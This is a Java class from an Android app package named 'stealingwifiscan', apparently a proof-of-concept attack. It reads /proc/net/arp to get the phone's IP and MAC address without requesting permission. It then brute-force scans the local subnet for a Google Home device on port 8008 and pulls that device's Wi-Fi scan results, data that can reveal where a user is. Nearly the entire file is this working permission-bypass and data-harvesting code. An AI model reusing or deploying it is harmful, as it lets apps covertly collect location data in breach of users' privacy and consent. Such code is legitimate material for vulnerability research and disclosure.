package com.yinhao.stealingwifiscan;

import android.annotation.TargetApi;
import android.os.Build;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

//using /proc/arp/net to retrieve self ip and mac without permission
public class HomeDeviceInfo {

    private String mCurrentIP;
    private String mCurrentMac;
    private String mGHDIP;

    HomeDeviceInfo() {
        BufferedReader bufferedReader = null;
        try {
            bufferedReader = new BufferedReader(new FileReader("/proc/net/arp"));

            String line;
            while ((line = bufferedReader.readLine()) != null) {
                String[] splitted = line.split(" +");
                if (splitted != null && splitted.length >= 4) {
                    mCurrentIP = splitted[0];
                    mCurrentMac = splitted[3];
                }
            }

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally{
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public String getSelfIP()
    {
        return mCurrentIP;
    }

    public String getSelfMac()
    {
        return mCurrentMac;
    }

    public String getmGHDIP() {
        return mGHDIP;
    }


    //launch brute-force search to find our Google Home Device
    @TargetApi(Build.VERSION_CODES.KITKAT)
    public String getIPfromMac(String MacAddr) throws IOException {
        String[] ip_parts = getSelfIP().split("\\.");
        String ip_candidate;
        String content = "";

        for(int i = 0; i<255; i++) {

            if(i == 1) {
                continue;
            }

            ip_candidate = ip_parts[0] + "." + ip_parts[1] +"."+ ip_parts[2] + "." + Integer.toString(i);
            System.out.println(ip_candidate);

            URL url = new URL("http://" + ip_candidate + ":8008/setup/eureka_info");
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            try {
                InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                content = IOStreamProcessing.readStream(in);
                // we have something return, parse them to find out if MAC address matches
                if (!content.matches("")) {
                    JSONObject jObject = new JSONObject(content);
                    String this_mac = jObject.getString("mac_address");

                    //we found our Google Home, break the loop
                    if (this_mac.contains(MacAddr)) {
                        mGHDIP = ip_candidate;
                        return mGHDIP;
                    }
                }
            }
            catch (java.net.ConnectException e) {
                //This IP address does not exist, simply skip.
            }
            catch (JSONException e) {
                e.printStackTrace();
            } finally {
                urlConnection.disconnect();
            }
        }

        //return empty string
        return "";
    }


    public String getScanResults() throws IOException {
        //NO IP address found for Google Home
        if (mGHDIP.matches("")) {
            return "";
        }

        String content = "";
        URL url = new URL("http://" + mGHDIP + ":8008/setup/scan_results");
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        try {
            InputStream in = new BufferedInputStream(urlConnection.getInputStream());
            content = IOStreamProcessing.readStream(in);

        }
        finally {
            urlConnection.disconnect();
        }

        return content;
    }

    public void setGHDIP(String ip_addr) {
        mGHDIP = ip_addr;
    }
}